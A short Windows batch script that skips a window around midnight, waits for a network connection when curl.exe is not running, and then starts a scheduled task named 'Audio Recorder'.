@echo off

REM Check if the current time is between 11:50 PM and 12:05 AM
setlocal
set "hour=%time:~0,2%"
if %hour% equ 23 (
    if %time:~3,2% geq 50 (
        endlocal
        goto :EOF
    )
)
if %hour% equ 0 (
    if %time:~3,2% leq 5 (
        endlocal
        goto :EOF
    )
)
endlocal

REM Check if curl.exe is running
tasklist | find /i "curl.exe" > nul
if errorlevel 1 (
    :check_network
    REM Check if internet connection is available
    ping 8.8.8.8 -n 1 -w 500 > nul
    if errorlevel 1 (
        REM Wait for 10 seconds and try again
        timeout /t 10 /nobreak > nul
        goto :check_network
    )
    REM If ping is successful, start the "Audio Recorder" task
    schtasks /run /tn "\Audio Recorder" /I
)
